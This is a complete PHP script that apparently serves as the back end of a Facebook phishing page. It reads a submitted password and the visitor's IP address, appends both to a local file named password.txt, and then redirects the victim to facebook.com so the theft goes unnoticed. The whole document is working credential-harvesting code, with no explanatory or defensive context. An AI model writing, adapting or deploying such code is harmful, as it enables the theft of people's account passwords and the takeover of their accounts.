<?php
  $password = $_POST["password"];
  if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
  } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
      $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
  } else {
      $ip = $_SERVER['REMOTE_ADDR'];
  }
  $content = "Password: ".$password." - IP: ".$ip.".
";
  $fp = fopen("password.txt","a");
  fwrite($fp,$content);
  fclose($fp);
  
  header('Location: https://facebook.com/');
  die();
?>